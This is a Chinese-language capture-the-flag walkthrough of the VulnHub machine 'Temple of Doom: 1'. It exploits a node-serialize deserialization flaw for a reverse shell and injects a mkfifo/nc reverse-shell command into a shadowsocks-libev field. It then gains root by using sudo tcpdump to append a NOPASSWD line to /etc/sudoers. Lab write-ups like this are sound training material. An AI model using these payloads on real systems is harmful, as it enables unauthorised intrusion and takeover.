# Temple of Doom: 1

2024-4-27 https://www.vulnhub.com/entry/temple-of-doom-1,243/

difficulty: Easy/Intermediate

## IP

192.168.10.176

## Scan

Open Port -> 22,666

```
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.7 (protocol 2.0)
| ssh-hostkey:
|   2048 956804c7420304cd004e367ecd4f66ea (RSA)
|   256 c3065f7f17b6cbbc796b4646cc113a7d (ECDSA)
|_  256 630c288825d5481982bbbd72c66c6850 (ED25519)
666/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
```

22 端口不能匿名访问，666 端口对应的是一个 nodejs express 服务。

访问 http://192.168.10.176:666/ 页面上提示：Under Construction, Come Back Later!

对 666 web 端口扫描下目录，没有扫描到其他目录信息。

看样子我们的攻击路径，就是在这个 nodejs 服务上了。再次访问后出现了错误提示：

```
SyntaxError: Unexpected token F in JSON at position 79
    at JSON.parse (<anonymous>)
    at Object.exports.unserialize (/home/nodeadmin/.web/node_modules/node-serialize/lib/serialize.js:62:16)
    at /home/nodeadmin/.web/server.js:12:29
    at Layer.handle [as handle_request] (/home/nodeadmin/.web/node_modules/express/lib/router/layer.js:95:5)
    at next (/home/nodeadmin/.web/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/home/nodeadmin/.web/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/home/nodeadmin/.web/node_modules/express/lib/router/layer.js:95:5)
    at /home/nodeadmin/.web/node_modules/express/lib/router/index.js:281:22
    at Function.process_params (/home/nodeadmin/.web/node_modules/express/lib/router/index.js:335:12)
    at next (/home/nodeadmin/.web/node_modules/express/lib/router/index.js:275:10)
```

根据上面错误提示，可以看到此服务使用了 json 序列化，并且在/home 目录下，发现了一个用户 nodeadmin。

具体看以下请求中的访问信息：

```
GET / HTTP/1.1
Host: 192.168.10.176:666
Cookie: profile=eyJ1c2VybmFtZSI6IkFkbWluIiwiY3NyZnRva2VuIjoidTMydDRvM3RiM2dnNDMxZnMzNGdnZGdjaGp3bnphMGw9IiwiRXhwaXJlcz0iOkZyaWRheSwgMTMgT2N0IDIwMTggMDA6MDA6MDAgR01UIn0
Connection: close
```

看到上面的 cookie 的 profile 貌似是 base64 编码，解码后看看是什么：

```
{"username":"Admin","csrftoken":"u32t4o3tb3gg431fs34ggdgchjwnza0l=","Expires=":Friday, 13 Oct 2018 00:00:00 GMT"}
```

应该是 json 这里，是否我们能进行相关利用。经过查找，发现了相关的漏洞描述：Exploiting Node.js deserialization bug for Remote Code Execution (CVE-2017-5941)

对应的漏洞利用说明 https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf

```
Node.JS - 'node-serialize' Remote Code Execution (2) | nodejs/webapps/49552.py
```

修改 url 和 payload 中的 ip 和端口之后，在 kali 上进行监听接收反弹，执行此 py 脚本看能否进行利用。

```
python2 49552.py
```

执行后，我们在 kali 上接收到了反弹的连接，继续进行权限提升，先升级下 tty：python -c 'import pty; pty.spawn("/bin/bash")'

在 /etc/passwd 中发现了其他 2 个用户：

```
root:x:0:0:root:/root:/bin/bash
nodeadmin:x:1001:1001::/home/nodeadmin:/bin/bash
fireman:x:1002:1002::/home/fireman:/bin/bash
```

但是 fireman 的目录我们进不去。

经过信息侦察，没有直接发现密码之类的信息，也没有 SUID 之类的特权程序。但是，发现 fireman 运行了 /usr/local/bin/ss-manager，看看这个程序有没有漏洞利用点， ss-manager 的版本为 shadowsocks-libev 3.1.0，在 searchsploit 中找到了对应版本的 exp：

```
shadowsocks-libev 3.1.0 - Command Execution | linux/local/43006.txt
```

先在我们的 kali 上建立监听：nc -lvnp 7777

发现 ss-manager 运行在 8839 端口上，在目标机器上执行下面的代码：

```
nc -u 127.0.0.1 8839

# nc 连接成功后，输入下面的代码
add: {"server_port":8003, "password":"test", "method":"||rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.10.3 7777 >/tmp/f||"}
```

这时，我们 7777 监听上就得到的反弹的 shell 会话：

```
sh-4.4$ id
id
uid=1002(fireman) gid=1002(fireman) groups=1002(fireman)
```

查看 fireman 的特殊权限：

```
[fireman@localhost ~]$ sudo -l

User fireman may run the following commands on localhost:
    (ALL) NOPASSWD: /sbin/iptables
    (ALL) NOPASSWD: /usr/bin/nmcli
    (ALL) NOPASSWD: /usr/sbin/tcpdump
```

发现 tcpdump 可以有 sudo 的提权利用：

```
echo 'echo "fireman ALL=(ALL)NOPASSWD:ALL" >> /etc/sudoers' > /tmp/shell
chmod +x /tmp/shell
sudo /usr/sbin/tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/shell -Z root
```

最终 fireman 获得了超级权限：

```
sudo -l
User fireman may run the following commands on localhost:
    (ALL) NOPASSWD: /sbin/iptables
    (ALL) NOPASSWD: /usr/bin/nmcli
    (ALL) NOPASSWD: /usr/sbin/tcpdump
    (ALL) NOPASSWD: ALL

sudo su
```
